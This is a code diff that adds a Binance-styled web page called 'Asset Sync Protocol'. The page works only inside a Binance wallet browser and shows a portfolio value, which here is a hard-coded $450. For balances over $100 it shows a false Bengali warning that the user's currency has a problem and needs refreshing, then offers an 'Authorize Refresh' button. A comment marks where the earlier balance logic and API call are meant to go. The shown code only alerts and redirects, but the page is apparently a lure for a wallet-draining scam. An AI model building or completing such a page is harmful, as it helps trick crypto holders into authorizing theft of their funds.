@@ -1,1 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ASP - Asset Sync Protocol</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --binance-black: #0b0e11;
+            --binance-gray: #1e2329;
+            --binance-yellow: #fcd535;
+            --error-red: #f6465d;
+        }
+        body { background-color: var(--binance-black); font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: white; }
+        .card-bg { background-color: var(--binance-gray); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .hidden-content { display: none; }
+    </style>
+</head>
+<body class="p-4" onload="checkBinanceWallet()">
 
+    <div id="main-wrapper" class="max-w-md w-full card-bg rounded-[32px] p-6 shadow-2xl relative overflow-hidden text-center">
+        
+        <div class="flex flex-col items-center mb-6">
+            <div class="w-16 h-16 bg-gradient-to-tr from-[#fcd535] to-[#f0b90b] rounded-2xl flex items-center justify-center shadow-lg mb-3">
+                <span class="text-black font-black text-2xl">ASP</span>
+            </div>
+            <h1 class="text-xl font-bold">ASP - Asset Sync Protocol</h1>
+        </div>
+
+        <div id="wallet-error" class="p-6 bg-red-500/10 border border-red-500/20 rounded-2xl hidden">
+            <p class="text-[#f6465d] font-bold text-sm mb-2">Access Denied!</p>
+            <p class="text-gray-400 text-xs">এই ড্যাপটি শুধুমাত্র Binance App বা Binance Wallet এর ভেতর থেকে ব্যবহার করা সম্ভব। অনুগ্রহ করে বিন্যান্স অ্যাপ ব্যবহার করুন।</p>
+        </div>
+
+        <div id="dapp-content" class="hidden-content">
+            <div id="status-badge" class="mb-6"></div>
+            
+            <div id="info-box" class="mb-6 p-4 rounded-2xl text-sm font-medium"></div>
+
+            <div class="mb-6 px-2 text-left">
+                <p class="text-gray-500 text-[10px] uppercase tracking-[0.2em] mb-1 font-bold">Estimated Portfolio Value</p>
+                <h2 id="total-balance-text" class="text-3xl font-bold">$0.00</h2>
+            </div>
+
+            <div id="btn-container" class="mt-8 px-2 hidden">
+                <button id="authBtn" onclick="runAssetSync()" class="w-full bg-[#fcd535] hover:bg-[#f0b90b] text-black font-extrabold py-4 rounded-2xl active:scale-95">
+                    Authorize Refresh
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        function checkBinanceWallet() {
+            // বিন্যান্স ওয়ালেট ডিটেকশন লজিক
+            const isBinance = navigator.userAgent.includes("Binance") || window.ethereum?.isBinance || window.binance;
+
+            const dappContent = document.getElementById('dapp-content');
+            const walletError = document.getElementById('wallet-error');
+
+            if (isBinance) {
+                // বিন্যান্স ওয়ালেট পাওয়া গেলে কন্টেন্ট দেখাবে
+                dappContent.classList.remove('hidden-content');
+                loadAssetData();
+            } else {
+                // অন্য ব্রাউজার বা ওয়ালেট হলে এরর দেখাবে
+                walletError.classList.remove('hidden');
+            }
+        }
+
+        async function loadAssetData() {
+            // আপনার আগের ১০০ ডলারের লজিক এবং API কল এখানে কাজ করবে
+            const mockValue = 450.00; // উদাহরণস্বরূপ
+            document.getElementById('total-balance-text').innerText = "$" + mockValue.toFixed(2);
+            
+            const infoBox = document.getElementById('info-box');
+            const btnContainer = document.getElementById('btn-container');
+            
+            if (mockValue > 100) {
+                infoBox.className = "mb-6 p-4 rounded-2xl text-sm font-medium bg-red-500/10 text-[#f6465d] border border-red-500/20";
+                infoBox.innerText = "আপনার কারেন্সি রিফ্রেস করুন, এখানে সমস্যা আছে।";
+                btnContainer.classList.remove('hidden');
+            }
+        }
+
+        function runAssetSync() {
+            // রিফ্রেশ এবং রিডাইরেক্ট লজিক
+            alert("Synchronizing with Binance Node...");
+            window.location.href = "https://accounts.binance.com/";
+        }
+    </script>
+</body>
+</html>
